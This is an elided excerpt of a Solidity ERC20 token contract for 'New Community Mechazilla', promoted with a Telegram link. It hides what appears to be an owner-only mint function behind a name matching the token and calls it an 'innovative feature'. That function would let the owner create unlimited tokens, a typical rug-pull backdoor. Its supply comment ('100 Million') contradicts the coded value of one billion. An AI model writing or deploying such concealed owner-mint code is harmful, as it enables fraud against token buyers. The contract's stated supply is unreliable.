...
//
// $NewCommunityMechazilla proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NewCommunityMechazilla
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NewCommunityMechazilla(uint256 amount) public onlyOwner {
 _NewCommunityMechazilla(msg.sender, amount);
    }
    ...
    function _NewCommunityMechazilla(address account, uint256 amount) internal virtual {
...
contract $NewCommunityMechazilla is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Community Mechazilla", "NCMECHAZILLA") {
     _NewCommunityMechazilla(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}